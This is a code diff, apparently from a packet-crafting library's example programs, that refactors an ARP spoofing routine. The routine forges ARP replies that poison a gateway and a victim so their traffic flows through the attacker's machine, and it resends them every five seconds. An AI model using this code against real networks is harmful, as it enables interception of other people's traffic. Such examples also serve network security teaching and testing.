@@ -1,5 +1,5 @@
 /*
- * Copyright (c) 2012, Nasel
+ * Copyright (c) 2012, Matias Fontanini
  * All rights reserved.
  *
  * Redistribution and use in source and binary forms, with or without
@@ -62,18 +62,18 @@ void do_arp_spoofing(NetworkInterface iface, IPv4Address gw, IPv4Address victim,
     
     /* We tell the gateway that the victim is at out hw address,
      * and tell the victim that the gateway is at out hw address */
-    ARP *gw_arp     = new ARP(gw, victim, gw_hw, info.hw_addr), 
-        *victim_arp = new ARP(victim, gw, victim_hw, info.hw_addr);
+    ARP gw_arp(gw, victim, gw_hw, info.hw_addr), 
+        victim_arp(victim, gw, victim_hw, info.hw_addr);
     // We are "replying" ARP requests
-    gw_arp->opcode(ARP::REPLY);
-    victim_arp->opcode(ARP::REPLY);
+    gw_arp.opcode(ARP::REPLY);
+    victim_arp.opcode(ARP::REPLY);
     
     /* The packet we'll send to the gateway and victim. 
      * We include our hw address as the source address
      * in ethernet layer, to avoid possible packet dropping
      * performed by any routers. */
-    EthernetII to_gw(gw_hw, info.hw_addr, gw_arp);
-    EthernetII to_victim(victim_hw, info.hw_addr, victim_arp);
+    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
+    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
     while(true) {
         // Just send them once every 5 seconds.
         sender.send(to_gw, iface);
